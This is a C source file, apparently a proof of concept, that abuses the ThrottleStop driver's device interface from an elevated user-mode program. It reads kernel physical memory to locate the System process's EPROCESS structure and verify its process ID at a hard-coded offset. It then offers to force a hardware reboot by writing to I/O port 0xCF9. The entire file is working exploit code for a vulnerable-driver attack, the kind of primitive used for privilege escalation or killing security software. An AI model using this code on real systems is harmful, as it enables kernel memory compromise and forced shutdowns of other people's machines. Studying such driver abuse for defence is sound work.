#include "EProcess.h"
#include <stdio.h>

HANDLE g_hDevice = INVALID_HANDLE_VALUE;

BOOL IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("Error: OpenProcessToken failed (code: %lu)\n", GetLastError());
        ExitProcess(1);
    }
    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        printf("Error: GetTokenInformation failed (code: %lu)\n", GetLastError());
        ExitProcess(1);
    }

    CloseHandle(hToken);
    return elevation.TokenIsElevated;
}

int main() {
    if (!IsElevated()) {
        printf("This program requires elevated privileges. Please run as administrator.\n");
        return 1;
    }

    g_hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hDevice == INVALID_HANDLE_VALUE) {
        printf("Error: Failed to open ThrottleStop device handle using CreateFileW (code: %lu)\n", GetLastError());
        return 1;
    }

    NTSTATUS status = BuildMemoryMap();
    if (!NT_SUCCESS(status)) {
        printf("Failed to build memory map: 0x%X\n", status);
        CloseHandle(g_hDevice);
        return 1;
    }

    ULONGLONG systemEPROCESS = GetEprocessFromPid(4);
    if (systemEPROCESS == 0) {
        printf("Failed to get EPROCESS for system process.\n");
        FreeMemoryMaps();
        CloseHandle(g_hDevice);
        return 1;
    }

    const int UniqueProcessId = 0x1D0;
    DWORD systemProcessId = 0;
    if (!ReadPhysicalMemoryDword(vtop(systemEPROCESS + UniqueProcessId), &systemProcessId)) {
        printf("Failed to read UniqueProcessId from system process.\n");
        FreeMemoryMaps();
        CloseHandle(g_hDevice);
        return 1;
    }

    printf("System process ID obtained from EPROCESS: %lu\n", systemProcessId);
    printf("System process ID %s match expected value.\n", (systemProcessId == 4) ? "does" : "doesn't");

    printf("\nDo you want to force restart the system? (y/n): ");
    char ch;
    scanf_s("%c", &ch, 1);
    if (ch == 'y' || ch == 'Y') {
        WriteIoPortByte(0xCF9, 0x0E);
		printf("Restart command sent. You are not supposed to see this, if you are then there's something off.\n");
    }

    FreeMemoryMaps();
    CloseHandle(g_hDevice);
    return 0;
}
